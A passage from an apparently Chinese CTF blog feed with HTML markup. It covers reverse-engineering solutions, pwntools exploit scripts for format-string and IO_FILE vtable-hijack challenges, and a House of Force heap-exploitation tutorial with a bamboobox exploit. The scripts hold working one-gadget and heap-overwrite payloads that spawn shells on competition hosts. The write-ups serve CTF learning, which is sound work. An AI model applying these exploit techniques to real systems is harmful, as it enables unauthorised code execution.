class="hljs-number">12</span>]: <span class="hljs-number">151</span><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">13</span>]: <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">151</span>)</span><span class="hljs-variable">Out</span>[<span class="hljs-number">13</span>]: <span class="hljs-string">'0x97'</span></code></pre></div><p>所以去除这8个字节的混淆代码，然后修改<code>co_code</code>长度为<code>0x8f</code>。</p><h4 id="还原后的pyc开头"><a href="#还原后的pyc开头" class="headerlink" title="还原后的pyc开头"></a>还原后的pyc开头</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>反编译方法就多种多样了，可以在线什么的，我使用的<code>uncompyle6</code>.</p><div class="hljs"><pre><code class="hljs undefined">uncompyle6 -o <span class="hljs-number">1.</span>py <span class="hljs-number">1.</span>pyc</code></pre></div><div class="hljs"><pre><code class="hljs undefined"># uncompyle6 version <span class="hljs-number">3.7</span><span class="hljs-number">.1</span># Python bytecode <span class="hljs-number">2.7</span> (<span class="hljs-number">62211</span>)# Decompiled <span class="hljs-keyword">from</span>: Python <span class="hljs-number">2.7</span><span class="hljs-number">.16</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">29</span> <span class="hljs-number">2020</span>, <span class="hljs-number">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">37</span>)# [GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">11.0</span><span class="hljs-number">.3</span> (clang<span class="hljs-number">-1103.0</span><span class="hljs-number">.29</span><span class="hljs-number">.20</span>) (-macos10<span class="hljs-number">.15</span>-objc-# Embedded file name: pyCharm.py# Compiled at: <span class="hljs-number">2020</span><span class="hljs-number">-06</span><span class="hljs-number">-15</span> <span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">54</span><span class="hljs-keyword">import</span> base64a = <span class="hljs-string">'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM='</span>flag = raw_input(<span class="hljs-string">'Are u ready?'</span>)c = base64.b64encode(flag)d = list(c)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):    d[i] += <span class="hljs-string">'a'</span>ohh = (<span class="hljs-string">''</span>).join(d)<span class="hljs-keyword">if</span> ohh == a:    print <span class="hljs-string">'great!waht u input is the flag u wanna get.'</span><span class="hljs-keyword">else</span>:    print <span class="hljs-string">'pity!'</span>%</code></pre></div><p>反编译后这题就十分简单了。</p><p>给的字符串把“a”，去除后解码base64即可。</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。<br>然后丢vscode。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>直接路径就出来了。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attribute">jkkjjhjjkjjkkkuukukkuuhhhuukkk</span></code></pre></div><p>Md5一下即可。</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p> 利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./springboard'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"1"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"2"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"3"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"%13$pAAAA%11$p"</span>)sleep(<span class="hljs-number">0.1</span>)ru(<span class="hljs-string">"0x"</span>)tag = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xe0</span>ru(<span class="hljs-string">"AAAA0x"</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) <span class="hljs-number">-0x21b97</span>info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)key1 = hex(tag)[<span class="hljs-number">-4</span>:]print(key1)payload = <span class="hljs-string">'%&#123;&#125;c%13$hn'</span>.format(int(key1,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)rec = rce18[<span class="hljs-number">1</span>] + libc_basekey2 = hex(rec)[<span class="hljs-number">-4</span>:]print(key2)payload = <span class="hljs-string">'%&#123;&#125;c%39$hn'</span>.format(int(key2,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)key3 = int(hex(tag)[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>) + <span class="hljs-number">2</span>print(key3)payload = <span class="hljs-string">'%&#123;&#125;c%13$hhn'</span>.format(key3)sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)key4 = hex(rec)[<span class="hljs-number">-6</span>:<span class="hljs-number">-4</span>]print(key4)payload = <span class="hljs-string">'%&#123;&#125;c%39$hhn'</span>.format(int(key4,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)itr()<span class="hljs-comment"># 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)</span><span class="hljs-comment"># 0008| 0x7fffffffe2f8 --&gt; 0x55554780</span><span class="hljs-comment"># 0016| 0x7fffffffe300 --&gt; 0x555555756010 ("11111111aaaaaaaa1111111122222222\n")</span><span class="hljs-comment"># 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00</span><span class="hljs-comment"># 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)</span><span class="hljs-comment"># 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)</span><span class="hljs-comment"># 0048| 0x7fffffffe320 --&gt; 0x1</span><span class="hljs-comment"># 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a ("/media/psf/mypwn/ahys/6/springboard/springboard")</span><span class="hljs-comment"># 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0</span><span class="hljs-comment"># 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)</span><span class="hljs-comment"># 0080| 0x7fffffffe340 --&gt; 0x0</span><span class="hljs-comment"># 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42</span><span class="hljs-comment"># 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)</span><span class="hljs-comment"># 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1</span><span class="hljs-comment"># 0112| 0x7fffffffe360 --&gt; 0x0</span><span class="hljs-comment"># 0120| 0x7fffffffe368 --&gt; 0x0</span><span class="hljs-comment"># 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42</span><span class="hljs-comment"># 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42</span><span class="hljs-comment"># 0144| 0x7fffffffe380 --&gt; 0x0</span><span class="hljs-comment"># 0152| 0x7fffffffe388 --&gt; 0x0</span><span class="hljs-comment"># 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</span></code></pre></div><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>考点就是<code>IO_FILE</code>的相关知识了，是针对伪造 vtable 劫持程序流程。</p><p>这个题估计是参考<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）</p><h4 id="fclose-函数调用的-vtable-函数"><a href="#fclose-函数调用的-vtable-函数" class="headerlink" title="fclose 函数调用的 vtable 函数"></a>fclose 函数调用的 vtable 函数</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable 函数 指针：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">/* The 'finish' function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */</span>typedef void (*_IO_finish_t) (FILE *, <span class="hljs-built_in">int</span>); <span class="hljs-comment">/* finalize */</span>#define <span class="hljs-constructor">_IO_FINISH(FP)</span> JUMP1 (__finish, FP, <span class="hljs-number">0</span>)#define <span class="hljs-constructor">_IO_WFINISH(FP)</span> WJUMP1 (__finish, FP, <span class="hljs-number">0</span>)<span class="hljs-keyword">struct</span> _IO_jump_t&#123;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy2</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_finish_t</span>, <span class="hljs-params">__finish</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_overflow_t</span>, <span class="hljs-params">__overflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__underflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__uflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_pbackfail_t</span>, <span class="hljs-params">__pbackfail</span>)</span>;    <span class="hljs-comment">/* showmany */</span>    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsputn_t</span>, <span class="hljs-params">__xsputn</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsgetn_t</span>, <span class="hljs-params">__xsgetn</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekoff_t</span>, <span class="hljs-params">__seekoff</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekpos_t</span>, <span class="hljs-params">__seekpos</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_setbuf_t</span>, <span class="hljs-params">__setbuf</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_sync_t</span>, <span class="hljs-params">__sync</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_doallocate_t</span>, <span class="hljs-params">__doallocate</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_read_t</span>, <span class="hljs-params">__read</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_write_t</span>, <span class="hljs-params">__write</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seek_t</span>, <span class="hljs-params">__seek</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_close_t</span>, <span class="hljs-params">__close</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_stat_t</span>, <span class="hljs-params">__stat</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_showmanyc_t</span>, <span class="hljs-params">__showmanyc</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_imbue_t</span>, <span class="hljs-params">__imbue</span>)</span>;&#125;;</code></pre></div><p>对于攻击的vtable 函数 指针其中的：</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p><h4 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h4><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p><p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p><p>正是因为可以写，所以这个题难度就降低了很多。</p><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr的vtable</code>上<code>__finish__</code>指针修改为one gadget。<br>（这里的one gadget，需要自己多试）。</p><h5 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h5><p>第2次的2字节读入可以直接用其本来地址末2字节即可，直接在<code>__IO_2_1_stderr的vtable</code>不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个<code>\x60</code>一个字节即可。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./secret'</span>local_libc  = <span class="hljs-string">'/usr/lib/x86_64-linux-gnu/libc-2.29.so'</span>remote_libc = <span class="hljs-string">'./libc6_2.29-0ubuntu2_amd64.so'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10030</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()ru(<span class="hljs-string">"0x"</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">"printf"</span>]info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)ru(<span class="hljs-string">"addr"</span>)vtable = <span class="hljs-number">0x1e5758</span> + libc_bases(p64(vtable))sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># debug()</span>s(<span class="hljs-string">'\x60'</span>)sleep(<span class="hljs-number">0.1</span>)rec = <span class="hljs-number">0xe2386</span> + libc_bases(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+p64(rec))itr()</code></pre></div><p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Force</title>
    <link href="/2020/05/13/House%20of%20Force/"/>
    <url>/2020/05/13/House%20of%20Force/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本按照这wiki上面学的，简单记录一下。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3>House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li></ul><p>所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span>victim = av-&gt;top;<span class="hljs-built_in">size</span>   = chunksize(victim);<span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><span class="hljs-built_in">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (<span class="hljs-built_in">size</span>) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;    remainder_size = <span class="hljs-built_in">size</span> - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);    alloc_perturb(p, bytes);    <span class="hljs-built_in">return</span> p;&#125;</code></pre></div><p>所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p><h2 id="一般的利用办法"><a href="#一般的利用办法" class="headerlink" title="一般的利用办法"></a>一般的利用办法</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">remainder      = chunk<span class="hljs-constructor">_at_offset(<span class="hljs-params">victim</span>, <span class="hljs-params">nb</span>)</span>;av-&gt;top        = remainder;<span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span>#define chunk<span class="hljs-constructor">_at_offset(<span class="hljs-params">p</span>, <span class="hljs-params">s</span>)</span> ((mchunkptr)(((<span class="hljs-built_in">char</span> *) (p)) + (s)))</code></pre></div><p>之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p><h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容"><a href="#让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容" class="headerlink" title="让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容"></a>让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。<strong>通常应该都是打heap，因为heap的地址是相对的，不会收到地址随机化的影响。而打got的话，堆的地址是随机的，并无法确定申请多少size 大小的堆，可以攻击到got</strong></p><p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p><h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li><li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li><li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bamboobox'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25784</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'item name:'</span>,str(size))    sa(<span class="hljs-string">'item'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'item'</span>,str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(id,size,content)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'item'</span>,str(id))    sla(<span class="hljs-string">'item name'</span>,str(size))    sa(<span class="hljs-string">'item'</span>,str(content))context.log_level = <span class="hljs-string">'debug'</span>magic = <span class="hljs-number">0x400d49</span>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'chum'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> +p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,payload)size = -(<span class="hljs-number">0x40</span> + <span class="hljs-number">0x20</span>) - <span class="hljs-number">0x10</span>add(size,<span class="hljs-string">' '</span>)payload = p64(<span class="hljs-number">0x400d49</span>) + p64(<span class="hljs-number">0x400d49</span>)add(<span class="hljs-number">0x10</span>,payload)<span class="hljs-comment"># sla('choice:','5')</span>itr()</code></pre></div><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" 